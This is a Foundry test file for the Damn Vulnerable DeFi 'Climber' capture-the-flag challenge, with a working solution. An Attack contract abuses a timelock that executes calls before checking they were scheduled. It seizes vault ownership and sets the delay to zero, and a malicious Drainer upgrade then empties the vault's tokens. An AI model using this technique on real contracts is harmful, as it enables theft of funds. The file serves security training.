// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attack attacker = new Attack(proposer, vault, timelock, token, recovery);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attack {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    address proposer;
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;

    constructor(address _proposer, ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
        proposer = _proposer;
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // ClimberTimelock.execute() executes an operation before it checks if the operation was scheduled or not
        uint n = 4;
        targets = new address[](n);
        values = new uint256[](n);
        dataElements = new bytes[](n);

        // Grant this contract ownership of the vault so that we can upgrade it with a drainer later
        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(this)));

        // Allow the timelock to schedule events for itself
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));

        // Set readyAtTimestamp to now so we don't run into NotReadyForExecution
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // "Schedule" this execute via a helper. This has to be a separate method because dataElements[3] isn't finalized
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(this._schedule, ());

        timelock.execute(targets, values, dataElements, "");

        // Upgrade the vault with our drainer and transfer everything to the recovery address
        Drainer drainer = new Drainer();
        vault.upgradeToAndCall(address(drainer), abi.encodeCall(Drainer.drain, (token, recovery)));
    }

    function _schedule() external {
        // When I call abi.encodeCall(ClimberTimelock.schedule, ( ... )) directly (and grant the timelock instead of 
        // this contract the proposal role), the test debug shows different values for dataElements[3] passed into 
        // schedule and execute. In execute, I got the bytecode for the call, but in schedule, I got 0x, so the 
        // calculated id of the scheduled operation was different than the operation I actually executed
        timelock.schedule(targets, values, dataElements, "");
    }
}

contract Drainer is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    constructor() {
        _disableInitializers();
    }

    function drain(ERC20 token, address receiver) external {
        SafeTransferLib.safeTransfer(address(token), receiver, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}